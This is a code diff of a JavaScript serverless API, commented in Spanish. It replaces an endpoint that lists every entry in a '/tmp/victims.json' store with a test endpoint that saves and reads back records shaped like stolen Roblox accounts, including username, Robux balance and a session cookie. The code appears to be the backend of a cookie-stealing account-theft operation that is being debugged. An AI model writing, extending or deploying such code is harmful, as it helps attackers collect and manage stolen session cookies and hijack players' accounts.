@@ -1,25 +1,38 @@
-// api/verificar-datos.js
-import fs from 'fs';
-import path from 'path';
-
-const DB_PATH = path.join('/tmp', 'victims.json');
-
-export default function handler(req, res) {
+// api/test-guardado.js
+export default async function handler(req, res) {
     res.setHeader('Access-Control-Allow-Origin', '*');
     
-    const { userId } = req.query;
+    const baseUrl = `https://${req.headers.host}`;
+    const testId = `test_${Date.now()}`;
     
-    let victims = {};
-    try {
-        if (fs.existsSync(DB_PATH)) {
-            victims = JSON.parse(fs.readFileSync(DB_PATH, 'utf8'));
-        }
-    } catch (e) {}
-
+    // Datos de prueba
+    const testData = {
+        roblox: {
+            username: "TestUser",
+            userId: testId,
+            robux: 999
+        },
+        cookie: "TEST_COOKIE",
+        pais: "TestLand",
+        fecha: "10/03/2026",
+        hora: "12:00:00"
+    };
+    
+    // 1. Intentar guardar
+    const guardar = await fetch(`${baseUrl}/api/guardar`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ userId: testId, data: testData })
+    });
+    const resultadoGuardar = await guardar.json();
+    
+    // 2. Intentar leer
+    const leer = await fetch(`${baseUrl}/api/guardar?userId=${testId}`);
+    const resultadoLeer = await leer.json();
+    
     res.status(200).json({
-        archivo_existe: fs.existsSync(DB_PATH),
-        todos_los_users: Object.keys(victims),
-        datos_del_user: userId ? victims[userId] : null,
-        cantidad_total: Object.keys(victims).length
+        paso1_guardar: resultadoGuardar,
+        paso2_leer: resultadoLeer,
+        testId: testId
     });
 }
